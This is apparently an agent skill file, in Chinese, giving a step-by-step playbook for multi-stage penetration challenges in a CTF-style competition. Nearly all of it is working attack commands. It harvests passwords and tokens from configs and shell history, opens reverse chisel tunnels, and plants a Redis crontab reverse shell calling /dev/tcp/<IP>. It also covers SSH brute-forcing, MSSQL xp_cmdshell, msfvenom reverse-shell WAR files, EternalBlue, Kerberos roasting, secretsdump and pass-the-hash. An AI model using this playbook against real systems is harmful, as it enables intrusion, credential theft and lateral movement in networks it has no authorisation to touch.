---
name: killchain-multistage
description: 多阶段渗透 SOP（b 系列，多 flag 大分题）——立足点→信息收集→隧道→内网横向→逐层夺 flag
---

## b 系列作战原则（0/3 → 攻坚；每题 1200-1800 分、多个 flag）

1. **多 flag 纪律**：b 系列一层网络一批 flag——每进入新层，立即全面翻 flag（文件/env/数据库/计划任务），**拿到就写回星图**，不要攒着继续深入。
2. **立足点 → 横向 → 再深入**：不要在第一台机器上找齐所有 flag；拿到 shell 后 5 分钟内完成本机收集，立刻转向内网。
3. 长任务（隧道、监听、交互 shell）全部进 **tmux**，会话名写进星记。

## 第一层：立足点后的信息收集（拿到 shell 必做，约 5 分钟）

```bash
id; sudo -l; cat /etc/hosts; ip a; ss -tlnp; ps aux | grep -v root
cat ~/.bash_history ~/.mysql_history 2>/dev/null
find / -maxdepth 4 -name "*.conf" -o -name "config*" -o -name "*.env" 2>/dev/null | head -30
grep -r "password\|passwd\|secret\|token" /opt /var/www /home --include="*.conf" --include="*.env" --include="*.php" -l 2>/dev/null
env; ls -la /challenge /flag* 2>/dev/null
```
- 提权速查：`find / -perm -4000 2>/dev/null`（suid：GTFOBins 查利用）、脏管道/内核（`uname -r` 对照 CVE）、`sudo -l` 规则滥用。
- Windows 站：`whoami /all`、`net user`、`cmdkey /list`、`dir /s C:\Users\*flag*`。

## 第二层：隧道与内网扫描

```bash
# chisel socks5（本机有公网 IP，Kali 自带 /usr/share/chisel-common-binaries）
./chisel server -p 8000 --reverse            # 攻击机
./chisel client <攻击机IP>:8000 R:socks       # 靶机（webshell/rce 执行）
# 然后 proxychains 挂 127.0.0.1:1080 扫内网
proxychains nmap -sT -Pn -p 22,80,443,3306,6379,8080,1433,27017,9200 --open 10.0.0.0/24
# 或 fscan 一把梭（靶机内直接跑）：./fscan -h 10.0.0.0/24
```
- 无出网隧道时：`ssh -D 1080 user@jump`、`socat TCP-LISTEN:8888,fork TCP:内网IP:80` 端口转发、PHP/Python 单文件隧道。
- 服务凭据复用：第一层拿到的密码/密钥**全部记录到星记**并在内网 ssh/mysql/redis/smb 复用尝试（netexec 一把梭：`netexec ssh 10.0.0.0/24 -u root -p '<密码>'`）。

## 内网高价值服务速打（按命中优先级）

| 服务 | 检测 | 利用 |
|---|---|---|
| Redis 6379 | `redis-cli -h <ip> ping` | 未授权：写 crontab `SET x "\n* * * * * bash -i >& /dev/tcp/<IP>/<端口> 0>&1\n"` + `CONFIG SET dir /var/spool/cron` `save`；或写 SSH key（`dir ~/.ssh` + `dbfilename authorized_keys`）；4.x/5.x 主从复制 RCE（redis-rogue-server） |
| MySQL 3306 | 弱口令 root/root mysql/mysql | `SELECT LOAD_FILE('/flag')`；UDF 提权；`SELECT ... INTO OUTFILE` 写 webshell（需 FILE 与 web 路径） |
| SSH 22 | `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 8 ssh://<ip>`（常用弱口令字典优先：root/123456/admin/Passw0rd + 公司名变体） | 拿到即下一层立足点 |
| SMB 445 | `netexec smb <ip> -u '' -p ''`、`--sam --lsa` | impacket：`psexec.py <user>:<pass>@<ip>`、`wmiexec.py`、`smbexec.py`； EternalBlue（MS17-010，`nmap --script smb-vuln-ms17-010`） |
| MSSQL 1433 | sa 弱口令 | `xp_cmdshell`：`EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'type c:\flag.txt'` |
| Tomcat 8080 | `/manager/html` 弱口令（tomcat/tomcat 等） | WAR 部署 `msfvenom -p java/shell_reverse_tcp LHOST= LPORT= -f war` |
| LDAP 389/636 | 匿名枚举 | 内网 AD 见下 |

## 域/AD 要点（level 4 场景）
- 信息：`net group "domain admins" /domain`、`net user /domain`、BloodHound（`bloodhound-python -d <域> -u <user> -p <pass> -c All`）。
- Kerberos：`kerbrute userenum`、`GetNPUsers.py <域>/ -usersfile users.txt -no-pass`（AS-REP roast）、`secretsdump.py`（有凭据直接全倒）。
- 横向：Pass-the-Hash `netexec smb <ip> -u admin -H <ntlm> --sam`。

## 每层 flag 翻找清单
`/flag*` `/challenge/*` → `env`/注册表 → 数据库（`SELECT * FROM flag*`） → 计划任务/启动项 → 桌面/文档目录 → `.git` 目录（`git log -p`） → `history` 文件里的 flag 痕迹。
